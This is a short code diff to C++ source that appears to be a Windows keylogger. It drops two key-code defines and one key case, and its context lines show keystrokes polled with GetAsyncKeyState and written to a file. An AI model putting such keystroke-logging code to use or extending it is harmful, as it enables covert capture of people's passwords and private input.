@@ -29,7 +29,6 @@
 #define VK_SNAPSHOT 0x2c; 
 #define VK_LMENU 0xA4;
 #define VK_MBUTTON 0x04; 
-#define VK_OEM_1 0xBA;
 #define VK_DIVIDE 0x6F;
 #define VK_SUBTRACT 0x6D;
 #define VK_DECIMAL 0x6E; 
@@ -43,7 +42,6 @@
 #define VK_NUMPAD7 0x67;
 #define VK_NUMPAD8 0x68;
 #define VK_NUMPAD9 0x69;
-#define VK_OEM_5 0xDC;
 
 
 
@@ -322,11 +320,6 @@ bool Key_is_Listed(WORD iKey)
 			std::cout << "Z";
 			WriteToFile("Z");
 		}
-		break;
-
-	case 0xDC:
-		if (GetAsyncKeyState(0xA0))
-			std::cout << "|";
 		break;
 
 
